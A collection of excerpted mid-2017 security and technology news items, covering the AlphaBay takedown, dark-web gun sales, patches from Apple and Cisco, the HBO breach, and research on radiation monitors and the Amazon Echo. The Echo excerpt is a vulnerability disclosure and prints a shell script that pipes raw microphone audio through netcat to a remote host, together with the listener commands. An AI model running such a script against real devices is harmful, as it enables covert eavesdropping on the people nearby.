## After AlphaBay and Hansa taken down, dealers find home on DreamMarket

-   Two of the largest online black-market sites have been shuttered in a law enforcement crackdown, but drug dealers have moved in a hurry to a third "dark net" emporium, where listings of fentanyl and heroin have already spiked, according to analysts.

-  The newfound popularity of the website DreamMarket highlights the whack-a-mole challenges of policing drugs sold online, even as government officials touted the the death of the other two sites, AlphaBay and Hansa.

-  The Drug Enforcement Administration and the Justice Department announced Thursday that AlphaBay  described as a major source of fentanyl and heroin that has been linked to overdose deaths  had been seized and closed down.

-  Alphabay and Hansa advertised drugs, chemicals, counterfeit documents, weapon and computer malware among many other items and services, cloaking users in anonymity.

-  As soon as authorities shut down AlphaBay, sellers began migrating to other sites, according to Kela Targeted Cyber Intelligence, a Tel Aviv company that specializes in monitoring the dark net.

## Most Guns Sold on the Dark Web Originate from the United States, Study Finds, Surprising No One

- In contrast, Europe accounts for 23.6 percent of the gun sales, which is unsurprising given that most European countries have stricter gun-control laws than the US.

- In France, firearm applicants are subjected to rigorous background checks and sales are denied to those with criminal records.

- In the United Kingdom, private citizens arent allowed to own handguns.Worldwide distribution of arms venders by region (Source: RAND Europe)The dark web is both an enabler for the trade of illegal weapons already on the black market and a potential source of diversion for weapons legally owned, said Giacomo Persi Paoli, a research leader at RAND Europe and the reports lead author.

- Recent high-profile cases have shown that the threat posed by individuals or small groups obtaining weapons illegally from the dark web is real.

- The ability to not only arm criminals and terrorists, who can make virtually anonymous purchases, but also vulnerable and fixated individuals is perhaps the most dangerous aspect.Last year, the Bavarian State Criminal Police concluded that Munich rampage-shooter David Sonboly, 18, purchased a 9mm Glock 17 through a dark web marketplace.

## Alice and Bob: The Worlds Most Famous Cryptographic Couple

- This time, however, the idea was in the wild, and would soon be pursued by young computer scientists, Ronald Rivest, Adi Shamir, and Leonard Adleman, who were quick to see the commercial possibilities for public key cryptography on the emerging Internet. At this point, Alice and Bob did not yet exist.

- RSA Data Security continued to win lucrative contracts and was tapped by an emerging Internet technical committee to share the responsibility with Digital Equipment Corp. to certify encryption keys (later, in 1995, spun-off to become Verisign).

- In 1984, a year after Ron Rivest, Adi Shamir, and Leonard Adleman received the patent for the RSA algorithmand still early days for Alice and Bobthe cryptologist John Gordon gave an after-dinner speech about Alice and Bob at an April conference in Zurich.  The precise context of this meeting is unknown (it was likely the Zurich Seminar on Digital Communications: Applications of Source Coding, Channel Coding and Secrecy Coding); Gordons speech was at the invitation of Professor James Massey (see IEEE Spectrum, November 1983). The speech is legendary in the field of cryptography, and for good reason.

-  The problem facing Alice and Bob in Bennett, Brassard, and Roberts narrative is that a seemingly secure channel for communication is rendered imperfect in various ways: transmission errors can occur, and partial information can leak to Eve, the eavesdropper, who also can modify the transmissions arbitrarily. This is the first known appearance of Evea disruptive force in the history of Alice and Boband is the basis of their more widely cited paper Privacy Amplification by Public Discussion, published in the SIAM Journal on Computing in April 1988. Between Bennett, Brassard, and Roberts 1985 abstract and the publication their longer 1988 article, Eve had become a well-known and accepted third party in cryptographic communications.

- She was a central figure in Steven Rudichs dissertation on one-way functions (1988), in Rudich and Impagliazzos conference paper on a similar topic (i.e. Limits on the Provable Consequences of One-Way Permutations) (1989), Fischer, Paterson, and Rackoffs article on secret bit transmission (1990), and in Bennett et.

##  Bad boys, bad boys, what you gonna do? Not use your Hotmail or we'll get you

-                                 Analysis The alleged owner of dark-web marketplace AlphaBay was tracked down by FBI because he was stupid enough to include his real Hotmail address in the content management system used to run the site.                That is one of the eye-opening details in the case of Alexandre Cazes, the 25-year-old arrested earlier this month in Thailand suspected of being the administrator of an illegal marketplace trafficking in drugs, guns, counterfeit goods and hacking tools, among other items.                Cazes must have known that investigators would be all over him: AlphaBay had grown into the internet's biggest black market, with over 200,000 users and 40,000 sellers

- It had more than 250,000 listings  making it nearly 20 times larger than Silk Road, which was shut down in 2013 after a massive investigation by the FBI.                Which makes it all the more bizarre that, according to American prosecutors, he used his real email address, albeit a Hotmail address  Pimp_Alex_91@hotmail.com  as the administrator contact for the marketplace software

- As a result, every new user received a welcome email from that address when they signed up to the site, and everyone using its password recovery tool also received an email from that address.                However, rather than carefully set up and then abandon that email address, it turns out that Alexandre Cazes  Pimp Alex  had been using that address for years.                US Dept of Justice lawyers, in their case against Cazes, said "law enforcement subsequently learned the 'Pimp_Alex_9l@hotmail.com' email address belonged to a Canadian man named Alexandre Cazes with a birthdate of October 19, 1991, matching the numeric identifier in his Hotmail email address."                Not only that, but Cazes had also used the exact same alias as the admin username for the AlphaBay marketplace  Alpha02  and associated it with the Pimp Alex Hotmail address for many years, leaving a long digital trail that investigators easily followed.                  Not smart                And if there was any doubt, Cazes repeatedly added his full name to blog posts using that alias, and that email address on online forums.                It was of course still possible that the real mastermind behind the marketplace had elaborately set up Cazes as a fall guy, creating a digital trail to point them to the wrong guy

- That would have been smart.                Except when the investigators stormed Cazes' house in Bangkok, Thailand, they found him still logged into the AlphaBay website as the admin and actively communicating about problems with one of its data centers.                Adding to the fact that Cazes had done a terrible, terrible job of protecting himself and his illegal activities, he also did not encrypt his personal laptop  because when law enforcement searched it, they found "passwords to AlphaBay's servers and other infrastructure."                And just in case you had any doubt that this was not a criminal mastermind at work, Cazes had also used his Pimp Alex Hotmail address as well as an email address from his own business  EBX Technologies  to set up online bank accounts and crypto-currency accounts

- How did law enforcement know that Cazes was behind EBX Technologies? It was on his LinkedIn profile.                All of this enabled the authorities to do a huge sweep of his assets and turn up $5m in Bitcoin, $2m in Ethereum, $770,000 in Zcash and $474,000 in Monero  all now shifted to government accounts.                That was just the cryptocash

- Cazes' miserable operations security also led investigators to accounts in his and his wife's (Sunisa Thapsuwan) names at Bangkok Bank, Bank of Ayudhya, Kasikorn Bank, Siam Commercial Bank and several others.                Even more amazingly, the cops didn't even have to ask the banks for accounts under those names: Cazes had listed all of his accounts, his houses and his luxury cars in a spreadsheet on his unlocked, unencrypted laptop.                                                                                          Here you go                "The document was modeled after a personal financial statement  listing 'TOTAL NET WORTH' in bold at the top of the document," reveals the filing

- "Below the net worth heading, Cazes broke down his 'holdings' into various subcategories such as 'Asset holdings' and 'Cash holdings,' as well as by each distinct cryptocurrency ..

- and method of storage

## Bluetooth makes a mesh of itself with new spec

- Bluetooth's second application is broadcasting, most often used beacons that offer one-to-many links and are often used to provide location-dependent services or information. Bluetooth Mesh aims to make the standard capable of carrying data for longer distances, by bouncing messages through Bluetooth devices to their eventual destination. Hang on, you may well be saying at this point, WiFi has superior range and is also good at mesh networking.

- Nodes reliant on batteries need only connect every four days, making it possible to build sensors that should last years on a single coin-cell battery.

- Sipping power frugally means Bluetooth boffins expect it will be possible to do things like build asset-tracking Bluetooth widgets that can be periodically polled across a warehouse floor, with devices that already need power and are worthy of frequent control  think light bulbs - helping to move the data around instead of needing to build a dedicated network. There's another dimension to power, too: the SIG reckons its twenty-year heritage gives it impressive muscle, in terms of user base and implementers, that users would be wise to recognise before considering alternatives.

- That's not a nice alternative network standard you've got there, it would be a shame if something happened to it proposition, rather a strong hint to go with the herd rather than being an outlier who gets picked off. Money comes from the chance to avoid costlier network builds, because Bluetooth meshes can do without central controllers like routers.

- The low price of Bluetooth-equipped kit, the possibility some current hardware with enough RAM can be upgraded to participate in Bluetooth meshes and the Bluetooth community's depth and breadth of experience. This is all of course aimed squarely at the Internet of Things market, which explains why the Bluetooth SIG is also making much of its security credentials: thing-makers sure can use a leg-up in that department! The new specs are here.

## Co-founder of AlphaBay dark web for drugs and weapons found dead in cell

-                                                               Cazes, also known as DeSnake, was due to meet Thai prosecutors over extradition to the US an hour before his body was found Reuters                      Alexandre Cazes, believed to be behind dark net marketplace AlphaBay, has been found dead in a Bangkok jail cell.The suspected co-founder of AlphaBay, one of the largest dark web marketplaces, was found unresponsive at Thailands Narcotics Suppression Bureau.He was due to meet prosecutors pushing to extradite him to the United States just an hour before they found his body.Police say that evidence points to Mr Cazes taking his own life, according to the Sydney Morning Herald.Surveillance camera footage of the cell indicated no signs of physical assault, Police Major General Surasak Khunnarong said.His father Martin Cazes said it was difficult to believe that his son would take his own life.For my fathers heart its hard to accept that my son committed suicide..

- under police surveillance, its incredible, he told Canadian website Canoe.Mr Cazes senior said he was awaiting the autopsy results and hopes he will find out the truth behind his sons death.The US Embassy in Bangkok stated that Mr Cazes was detained at the request of the US with a view toward extradition to face federal criminal charges.Thai police arrested Mr Cazes, also known by the pseudonym DeSnake, on 5 July on charges of drug trafficking and money laundering.Authorities seized several million dollars, three properties and four Lambourghinis owned by Mr Cazes, according to Deutsch Welle.Mr Cazes was under investigation by local authorities.He was a computer expert involved with international transactions of bitcoins, Major General Soontorn Chalermkiat, a spokesman for Thailands Narcotics Suppression Bureau, told AFP.He didnt have any business in Thailand but he had many houses, the officer said.The properties were worth around 400 million baht (9m) according to the Bangkok Times.The Canadians wife, a Thai national, is believed to be pregnant

- She has subsequently been arrested on charges of money-laundering.Originally from Quebec, Mr Cazes was at the centre of an FBI investigation, accused of being an administrator and co-founder of AlphaBay.The website sold illegal goods, class A drugs, pornography, stolen credit cards and weapons.The website, which was shut down on 5 July, had up to $800,000 (611,000) of transactions every day, according to researchers.Anyone needing confidential support can call the Samaritans in the UK on 08457 90 90 90.

## Apple hurls out patches for dozens of security holes in iOS, macOS

- Apple has today released patches addressing roughly four dozen exploitable security vulnerabilities in iOS, macOS, and WatchOS. The iOS 10.3.3 update resolves 47 flaws for the iPhone, iPad and iPod Touch, including multiple remote code execution holes in the WebKit browser engine.

- Those include 16 memory corruption errors that could be exploited for remote code execution via a malicious webpage. One of those memory corruption bugs, CVE-2017-7055, was reported to Apple by the UK National Cyber Security Centre, a branch of the GCHQ spying nerve center.

- As usual, bug hunters with Google's Project Zero were also well represented, with Ian Beer, lokihardt, and Ivan Fratric credited for discovering multiple flaws. Other notable vulnerabilities include CVE-2017-7060, a bug in Safari Printing that allows an attacker to freeze the browser by flooding it with print dialogue boxes.

- Discovery of that bug was credited to Travis Kelley, with the City of Mishawaka, Indiana. Also addressed were flaws that allow attackers to crash the Messages app (CVE-2017-7063), and bugs in the iOS Kernel that allow an application to remotely execute code or access restricted memory space. Meanwhile, Mac users will need to update their systems as well, thanks to a fresh crop of security fixes for OS X Sierra, El Capitan, and Yosemite.

- Those updates include a half-dozen CVE-listed vulnerabilities in the Intel Graphics Driver that allow applications to execute arbitrary code at the kernel level and view restricted memory addresses. Also included in the update were multiple flaws in the macOS Kernel and a flaw in the Wi-Fi protocol (CVE-2017-9417) for both iOS and OS X that allow an attacker to "execute arbitrary code on the Wi-Fi chip."

## Verizon Wireless is apparently now throttling Netflix and Youtube to 10Mbps

- Its worth noting that Netflix has admitted to throttling mobile users for several years back in 2016.

- They claimed they did so to with their customers interests in mind, and that the goal was to protect consumers from exceeding mobile data caps. Use a VPN to beat YouTube and Netflix throttling Whether the current YouTube and Netflix throttling is because of Verizon or Netflix, the only solution for Verizon Wireless customers experiencing this throttling to regain their promised speeds is to use a VPN.

- Mobile data providers are currently allowed to do this type of throttling because FCC net neutrality rules dont apply to those companies.

- This type of throttling is a precursor to your telco selling premium streaming plans and trying to get an extra ten dollars or so out of you.

- As the FCC destroys net neutrality protections as we know it, expect more  not less  of the same. Are you being throttled by Verizon Wireless?

## Ethereum Hacks

- Like all such thefts, they're not a result of a cryptographic failure in the currencies, but instead a software vulnerability in the software surrounding the currency -- in this case, digital wallets.

- This is the second Ethereum hack this week.

- Thefirst tricked people in sending their Ethereum to another address.

- This is my concern about digital cash.

- The cryptography can be bulletproof, but the computer security will always be an issue.

## FCC has no documentation of DDoS attack that hit net neutrality comments

- " The FCC did release 16 pages of records, "though none of them shed any light on the events that led to the FCCs website crashing on May 8," Gizmodo wrote yesterday.

- " The Gizmodo article comes in the same week that the FCC refused to release the text of more than 40,000 net neutrality complaints that it has received from Internet users since June 2015.

- ) Pai has claimed that his proposed repeal of net neutrality rules is using a "far more transparent" process than the one used to implement net neutrality rules in 2015. UPDATE: The FCC released a statement this afternoon claiming that it is "categorically false" to suggest that "the FCC lacks written documentation of its analysis of the May 7-8 non-traditional DDoS attack that took place against our electronic comment filing system."

- The FCC statement said there is publicly available written analysis in the form of a letter to Congress (which we quoted and linked to in the next section of this article).

- " We published an analysis of the FCC's statements in May, concluding that the incident was caused either by "an unusual type of DDoS or poorly written spam bots."

## Game of Pwns: Hackers invade HBO, 'leak Game of Thrones script'

- HBO is the latest entertainment giant to have its precious content stolen and leaked by hackers, including program episodes and possibly Game of Thrones scripts. The security breach reportedly includes the script or a script treatment for next week's Game of Thrones episode, meaning fans will be disappointed to realize it's the same sword-sorcery-sex-and-intrigue as previous episodes. HBO confirmed its systems were infiltrated, saying in a statement: 

- HBO recently experienced a cyber incident, which resulted in the compromise of proprietary information.

- We immediately began investigating the incident and are working with law enforcement and outside cybersecurity firms.

- Data protection is a top priority at HBO, and we take seriously our responsibility to protect the data we hold.  The attackers reportedly copied 1.5TB of files and video from the telly goliath, including unreleased episodes of Ballers and Room 104 that have already been leaked and shared online. Whoever is responsible for the network breach is seeking notoriety, sending this email to journalists: 

- Disney's CEO Bob Iger said at the time that it wasn't a credible threat: We don't believe that it was real and nothing has happened. Meanwhile, production house Larson Studios, working on Netflix's Orange is the New Black, wasn't so lucky: unreleased episodes leaked onto the 'net when Netflix refused to pay miscreants a ransom to keep them under wraps.

## Qubes OS 4.0-rc1 has been released!

-                 Finally, after years of work, were releasing the first release candidate forQubes 4.0!Next Generation Qubes Core Stack for better integrationNo doubt this release marks a major milestone in Qubes OS development

- Thesingle most import undertaking which sets this release apart, is the completerewrite of the Qubes Core Stack

- We have a separate set of posts detailing thechanges (Why/What/How), and the first post is planned to be released in thecoming 2 weeks.This new Core Stack allows to easily extend the Qubes Architecture in newdirections, allowing us to finally build (in a clean way) lots of things wevewanted for years, but which would have been too complex to build on the oldQubes infrastructure

- The new Qubes Admin API, which we introduced in arecent post, is a prime example of one such feature.(Technically speaking, weve neatly put the Admin API at the heart of the newQubes Core Stack so that it really is part of the Core Stack, not merely anapplication built on top of it.)There are many more benefits that the new Core Stack brings besides the AdminAPI

- Just to name a few that might be most visible to the user or admin:  Simpler to customize and more flexible Disposable VMs,  More flexible and expressive (qrexec) policy definitions,  Flexible VM volume manager (easy to keep VMs on external drives, or inmemory-only),... and many more! The new Core Stack also brings lots of simplifications fordevelopers of Qubes-specific apps and services

- Again, we plan to publish postsabout all these cool new features in the coming weeks and months.One last important comment is that all the work we have done in this area hasbeen Xen-agnostic, aligned with our long-stated goal to makeQubes easily portable between different VMMs (hypervisors) and even non-VM-basedsystems, such as container-based ones.Fully virtualized VMs for better isolationAnother important change in this release (this time Xen-specific) is that wehave ditched para-virtualized mode and embraced fully-virtualized mode forQubes VMs

- The reason for this move has been entirely security-related, asexplained here and here.Originally, we planned to utilize the PVH mode of virtualization, which combinesthe benefits of processor virtualization technologies (VT-x and EPT), allowingfor simpler code in the hypervisor, thus improving security, withparavirtualized drivers for better performance and improved security due tosimplified interfaces to virtualized devices

- Even though we have long beenusing isolated stub domains to keep device I/Oemulators outside of the TCB, these stub domains themselves run in PV mode,which we are now moving away from.Sadly, due to the Linux kernel still not fully supporting this PVH mode(specifically problems with booting the kernels in this mode),we decided to go with the HVM-based VMs for this rc1 release

## Ever get remote code execution by fragging a player?

- The vulnerability was exploited by fragging a player, which casued a specially crafted ragdoll model to be loaded.

- We can import Shell32.dll to obtain a reference to the function ShellExecuteA, which can be used to launch other programs. Proof Of Concept In order to give third-party mod creators time to update their games, the proof of concept will be released in 30 days.

- The nexttoken function should accept a token length argument which would be used to perform bounds checking.

- This can be achieved by using the checkbins.py utility developed by the chromium team. Additionally, Source games should be sandboxed to restrict access to resources and to prevent new processes from being started.

- However, by enabling ASLR for all executable modules, a memory disclosure vulnerability is required to develop a reliable exploit.

## Bethlehem arrest sheds light on 'dark web' | Reading Eagle - NEWS

- Home News Bethlehem arrest sheds light on 'dark web'        Sunday July 30, 2017 12:01 AMBETHLEHEM, Pa

-  After his fiancee died taking drugs that came in the mail, a Florida man took investigators to the "dark web" store where he ordered them.The investigation that unfolded over the next four months led federal agents to the door of a Bethlehem man who allegedly sold the substances that caused the woman's death.Jeremy P

- Achey's arrest last month on federal drug charges revealed a possible Lehigh Valley node in a global network of drug dealers moving the trade from the streets to a hidden part of the internet

- He was one of 40,000 vendors, prosecutors say, in the dark web's largest marketplace, where users could anonymously buy illegal drugs, stolen credit card information, firearms and computer hacking tools before federal authorities, working with law enforcement around the world, seized it this month.But other dark web bazaars exist and more are likely to spring up, presenting an ongoing challenge for authorities

- The transactions are anonymous and difficult to trace and, law enforcement officials say, they're a more accessible source for fentanyl and similar powerful narcotics that are fueling the opioid overdose epidemic."It has opened up certain types of drugs to users who might not have been predisposed to use them," said Dusty Cladis of the U.S

- Drug Enforcement Administration, noting that online sales eliminate the need to meet a dealer face-to-face and remove the fear of being arrested.The potency of drugs such as fentanyl, up to 100 times stronger than morphine, means they can be distributed in small quantities that are easily mailed

- That makes them available in places where drugs might have previously been hard to buy."It's going to college campuses and military bases  places where it might be hard for traditional hand-to-hand drug transactions to occur," Cladis said, adding that the locations include small communities that street dealers haven't reached.Carnegie Mellon University researchers tracked purchases in 35 dark web marketplaces and estimated in 2015 that the markets had $300,000 to $700,000 in transactions every day.Achey, 43, allegedly operated his store in a dark web marketplace called AlphaBay, which served more than 200,000 users before it suddenly and mysteriously winked out of existence July 4

- On Thursday, the Justice Department announced an international operation to seize AlphaBay's servers and arrest its founder, Alexandre Cazes, a 25-year-old Canadian living in Thailand

## Cisco plugs command-injection hole in WebEx Chrome, Firefox plugins

- Cisco has patched its Chrome and Firefox WebEx plugins to kill a bug that allows evil webpages to execute commands on computers. A malicious page, when visited by a vulnerable Windows machine, can exploit the security flaw (CVE-2017-6753) to run arbitrary commands and code with the same privileges as the browser.

- Internet Explorer and Edge are not considered vulnerable, and both OS X and Linux versions of Chrome and Firefox are also safe. The bug was discovered by Google Project Zero researcher Tavis Ormandy and Divergent Security's Cris Neckar. "A vulnerability in Cisco WebEx browser extensions for Google Chrome and Mozilla Firefox could allow an unauthenticated, remote attacker to execute arbitrary code with the privileges of the affected browser on an affected system," Cisco said on Monday. "This vulnerability affects the browser extensions for Cisco WebEx Meetings Server, Cisco WebEx Centers (Meeting Center, Event Center, Training Center, and Support Center), and Cisco WebEx Meetings when they are running on Microsoft Windows. "The vulnerability is due to a design defect in the extension.

- An attacker who can convince an affected user to visit an attacker-controlled web page or follow an attacker-supplied link with an affected browser could exploit the vulnerability.

- If successful, the attacker could execute arbitrary code with the privileges of the affected browser.

- Users can see if their versions are the fixed release (1.0.12) by going to the extensions menu in the browser and, if an older version is run, selecting the "update extensions now" (Chrome) or "check for updates" (Firefox) option. Cisco says that while only the Chrome and Firefox plugins on Windows boxes are vulnerable to the flaw described, shared code between those browsers and the Internet Explorer/Edge plugins means that an update for Microsoft browsers has been released as well.

## Facebook's AI Keeps Inventing Languages That Humans Can't Understand

- 92432559story Facebook's AI Keeps Inventing Languages That Humans Can't Understand  (fastcodesign.com)   "Researchers at Facebook realized their bots were chattering in a new language," writes Fast Company's Co.Design

- "Then they stopped it." An anonymous reader summarizes their report:Facebook -- as well as Microsoft, Google, Amazon, and Apple -- said they were more interested in AI's that could talk to humans

- But when two of Facebook's AI bots negotiated with each other "There was no reward to sticking to English language," says Dhruv Batra, visiting research scientist from Georgia Tech at Facebook AI Research (FAIR)

- Co.Design writes that the AI software simply, "learned, and evolved," adding that the creation of new languages is a phenomenon Facebook "has observed again, and again, and again"

- And this, of course, is problematic. "Should we allow AI to evolve its dialects for specific tasks that involve speaking to other AIs? To essentially gossip out of our earshot? Maybe; it offers us the possibility of a more interoperable world, a more perfect place where iPhones talk to refrigerators that talk to your car without a second thought

- The tradeoff is that we, as humanity, would have no clue what those machines were actually saying to one another." One of the researchers believes that that's definitely going in the wrong direction

- "We already don't generally understand how complex AIs think because we can't really see inside their thought process

- Adding AI-to-AI conversations to this scenario would only make that problem worse."

## AMD Has No Plans To Release PSP Code

-  

-  AMD Has No Plans To Release PSP Code  (twitch.tv) 

- AMD has faced calls from Edward Snowden, Libreboot and the Reddit community to release the source code to the AMD Secure Processor (PSP), a network-capable co-processor which some believe has the capacity to act as a backdoor.

- But despite some signs earlier that it might consider opening the PSP code at some point, the chip-maker has now confirmed that there hasn't been a change of heart yet.

- "We have no plans on releasing it to the public," the company executives said in a tech talk (video).

## 'Anonymous' browsing data can be easily exposed, researchers reveal

- Some were sparse users, with just a couple of dozen of sites visited in the 30-day period they examined, while others had tens of thousands of data points: the full record of their online lives. Getting hold of the information was actually even easier than buying it.

- And while it was nominally an anonymous set, it was soon easy to de-anonymise many users. Dewes described some methods by which a canny broker can find an individual in the noise, just from a long list of URLs and timestamps.

- By creating fingerprints from the data, its possible to compare it to other, more public, sources of what URLs people have visited, such as social media accounts, or public YouTube playlists. A similar strategy was used in 2008, Dewes said, to deanonymise a set of ratings published by Netflix to help computer scientists improve its recommendation algorithm: by comparing anonymous ratings of films with public profiles on IMDB, researchers were able to unmask Netflix users  including one woman, a closeted lesbian, who went on to sue Netflix for the privacy violation.  Another discovery through the data collection occurred via Google Translate, which stores the text of every query put through it in the URL.

- From this, the researchers were able to uncover operational details about a German cybercrime investigation, since the detective involved was translating requests for assistance to foreign police forces. So where did the data come from?

- After Dewes and Eckert published their results, the browser plugin modified its privacy policy to say that it does indeed sell data, while making attempts to keep the information anonymous.

## Alexa, are you listening?

- )CMEM Shared Sizes: Audio A2D 9612 82836 Aux A2D 240276 1600276Unfortunately/fortunately during boot we are not dropped into a shell or a login prompt and the U-Boot sequence cannot be interrupted.The main MCU of the Amazon Echo is a DM3725 digital media processor by Texas Instruments with an ARM Cortex-A8 CPU.

- U-Boot then loads the kernel and passes control to it.The configuration of the Echo is such that it will first attempt to boot from an SD Card connected to the exposed debug pads before the internal eMMC unit.

- Using the provided 'shmbuf_tool' application developed by Amazon, we created a script that would continuously write the raw microphone data into a named fifo pipe which we then stream over TCP/IP to a remote service.

- On the remote device we receive the raw microphone audio, sample the data and either save it as a wav file or play it out of the speakers of the remote device.This technique does not affect the functionality of the Amazon Echo.The script to be ran on the Amazon Echo is as follows.startStream.sh#!/bin/sh mkfifo /tmp/spy cat /tmp/spy | nc x.x.x.x 1338  shmbuf_tool -m 2 -s 1 -S BMicsOut.shm -o /tmp/spy  To save the audio stream on the remote device run the following,$ nc -lp 1338 | sox -t raw -r 16k -e signed-integer -b 16 -c 1 - spy.wav or to play it from the speakers.$ nc -lp 1338 | aplay -f S16_BE -c 1 -r 16000The FixThis vulnerability has been confirmed on the 2015 and 2016 edition of the Amazon Echo however the 2017 edition is not vulnerable to this physical attack.

- However, product developers should not take it for granted that their customers won't expose their devices to uncontrolled environments such as hotel rooms [3].The Amazon Echo does include a physical mute button that disables the microphone on the top of the device or can be turned off when sensitive information is being discussed (this is a hardwire mechanism and cannot be altered via software).

## BearSSL - Change Log

- Version 0.5bearssl-0.5.tar.gz, released on July 30th, 2017.Added support for the BoarSSL / Twrch test framework.Header files now include the ritual mantras that make them compatible with C++.Better Makefile behaviour with Clang (FreeBSD compatibility).Worked around a bug of GCC 4.8 and 4.9 in 32-bit x86 mode.Incoming application data after initiating closure is now properly ignored.Some instances of (critical) Certificate Policies extensions are now ignored (when it is safe to do so).Fixed some behavioural bugs with regards to renegotiation (all were failing safe).Added encoded OID for hash functions in the public API, to help with using RSA signatures in non-SSL contexts.Fixed bug in AES/CBC decryption on x86 with AES-NI opcode (this was breaking decryption with AES/CBC cipher suites and TLS 1.0 only).Added an explicit stack buffer initialisation (some provably harmless accesses to uninitialised data were performed, Valgrind was not happy).Fixed bug in the search tree for the cache of SSL sessions (occasional lock-ups).Fixed bug in modular reduction in the special field for P-256 (this was infrequently breaking ECDSA signatures).Added support for exporting keying material (RFC 5705).Added new general-purpose API for AEAD implementations (in non-SSL contexts) and an AES/GCM implementation that follows that API.Added a function to forget saved session parameter in the LRU cache.Added a new ChaCha20 implementation that uses SSE2 on x86 architectures (both 32-bit and 64-bit).Version 0.4bearssl-0.4.tar.gz, released on April 3rd, 2017.New AES and GHASH implementations for POWER8 processors (provides AES/GCM at more than 2 gigabytes per second!).Improved GHASH implementation with AES-NI opcodes (pclmulqdq).New Poly1305 implementation with 64128 multiplications, available on some 64-bit architectures.New i62 big-integer code with 64128 multiplications, available on some 64-bit architectures (RSA is much faster).Some mostly cosmetic patches to support very old systems (BearSSL now compiles and run on Debian 2.2 potato from 2000, with GCC 2.95).Version 0.3bearssl-0.3.tar.gz, released on January 29th, 2017.Support for ALPN extension (RFC 7301).New big-integers support code (i15), that uses 15-bit words internally; this offers better performance and constant-time code on the ARM Cortex M series.On the ARM Cortex M, a bit of inline assembly can be used to speed up multiplications and modular exponentations.Many new elliptic curve implementations:ec_prime_i15: supports P-256, P-384 and P-521 with the i15 big integers.ec_p256_m15: specialised implementation for P-256; similar to i15 but faster

- Internally, 13-bit words are used (for easier carry propagation).ec_p256_m31: like ec_p256_m15, but using 30-bit words.ec_c25519_i15 and ecc25519_i31 implement Curve25519 with the i15 and i31 big integers, respectively.ec_c25519_m15 and ecc25519_m31 are specialised implementations of Curve25519 with 13-bit and 30-bit words, respectively; they are faster, but with a larger compiled code size.ec_all_m15 and ec_all_m31 are aggregate wrappers that provide support for the three NIST curves and Curve25519, with the m15/i15 or the m31/i31 code, respectively.New API for server-side private key handling: when using ECDHE, the pluggable module that computes the signature on the ServerKeyExchange message can now obtain the actual data, not just a hash thereof (this should help with EdDSA integration when that function is implemented).Revamped Makefile structure:Simplified configuration files (in the conf/ directory) to allow for selectable sets of parameters, including build directory.Visual Studio + nmake.exe is now a supported target.AES implementation with the AES-NI opcodes; works with GCC, Clang and Visual Studio, both in 32-bit and 64-bit modes.GHASH implementation with pclmulqdq; works with GCC, Clang and Visual Studio, both in 32-bit and 64-bit modes.Many fixes, including a buffer overrun.Version 0.2bearssl-0.2.tar.gz, released on December 13th, 2016.Support for ClientHello padding (RFC 7685).Support for TLS_FALLBACK_SCSV (RFC 7507) (server-side; on the client, this is entirely under control of the caller).New flag to prohibit renegotiations.API for saving and restoring session parameters (controllable session resumption on the client side).Client certificates: API to request a client certificate (on the server side), and to provide a client certificate (on the client side).API for generic name extraction from X.509 certificates (from the subject DN and the SAN extension).Improved T0 compilation (threaded code is about 10% shorter).ChaCha20+Poly1305 support (RFC 7905).Lots of fixes (including a couple of buffer overruns).Version 0.1bearssl-0.1.tar.gz, released on November 3rd, 2016.Initial release.

## My $169 development Chromebook

-                 How Chrome OS, Termux, YubiKey  Duo Mobile make for great usable securityBackstoryIn the last year while talking to respected security-focused engineers  developers, I've come to fully appreciate Google's Chrome OS design

- The architecture benefited from a modern view of threat modeling and real-world attacks

- For example, Trusted Platform Module (TPM) hardware chips are built into every Chromebook and deeply incorporated into the OS

- The design documents go into some detail on the specific protections that TPM provides, particularly around critical encryption functions.I also learned that Chromebook is the daily driver for many of Google's own senior developers and security engineers

- In short, the combination of the underlying Chromebook hardware with the OS architecture makes for a pretty compelling secure development environment.Fast forward to March

- In the past, I'd never given much thought to bringing my notebook with me while on travel -- it was just something I did as a matter of course

- Now, though, with the changing landscape of airline restrictions and seemingly ad hoc draconian rules for what can and can't be brought on board, I've had to seriously reconsider my routine

- There is zero chance I am willing to bag check my beloved Macbook Pro or Purism Librem, especially given carriers' long history of indifference to ground crews playing hacky-sack with luggage

## Three Vendors Decline to Patch Vulnerabilities in Nuclear Radiation Monitors

- Radiation monitoring gates installed at a border crossingRuben Santamarta, a security researcher for IOActive, has found various vulnerabilities in nuclear radiation monitoring equipment from three vendors, who when contacted by the researcher, declined to fix the reported flaws, each for various reasons.The vulnerabilities were found in multiple product models sold by Digi, Ludlum, and Mirion.Vulnerabilities found in very critical equipmentThe equipment that Santamarta looked at is radiation monitors, which are devices usually installed at nuclear facilities, sea ports, border crossings, and across cities, and are used to monitor radiation levels.This type of equipment is quite critical as it provides an early alarm system for radiation spikes in nuclear power plants, but also the presence of dirty bombs in a city's range.While these are edge case scenarios, radiation monitors are generally used to detect when nuclear power plant employees try to smuggle radioactive material out of their compound, and when someone attempts to cross the border with radioactive equipment and/or materials.Researcher found backdoor account, weak encryptionSantamarta says he tested various radiation monitor models, from massive car and human scanning portals to small sensor boxes that engineers pin on walls across a nuclear power plant's building complex.The vulnerabilities Santamarta found ranged from simple backdoor accounts to inadequate encryption strength, and from hard-coded encryption keys to the use of insecure protocols.All in all, Santamarta said that an attacker could use the backdoor to take over devices, or take advantage of the other vulnerabilities to mount a Man-in-the-Middle attack, intercept and alter traffic between monitoring devices and their controller.If successful, an attacker would be in the position to disable alarms or print out false readings

- The only condition was that an attacker must be in proximity to the vulnerable devices, in order to connect to their network or alter radio signals.Vendors declined to patch flaws

- Two later changed their mindsSantamarta says he contacted all three vendors

- Below are the responses he got from the manufacturers:Digi acknowledged the report, but will not fix the issues as they do not consider them security issues.Ludlum acknowledged the report, but refused to address the issues

- According to them, these devices are located in secure facilities, which is enough to prevent exploitation.Mirion acknowledged the vulnerabilities, but will not patch them asit would break WRM2 interoperability

- Mirion contacted their customers to warn of this situation

- They will work in the future to add additional security measures.Users can find out more about Santamarta's work with radiation monitoring devices by reading his research paper titled Go Nuclear: Breaking Radiation Monitoring Devices.Today, after Santamarta's presentation, ICS-CERT also issued an alert regarding radio-based telemetry-enabled Mirion devices based on Santamarta's work.Before Santamarta gave a presentation on these vulnerabilities at the Black Hat USA 2017 security conference, Digi and Mirion contacted the researcher to inform him they changed their minds and said they would be working together to patch the reported vulnerabilities

- Despite this change of heart, the flaws are still unpatched, and will probably remain so for months if not years.

## Decompiled SLocker Android Ransomware Source Code Published Online

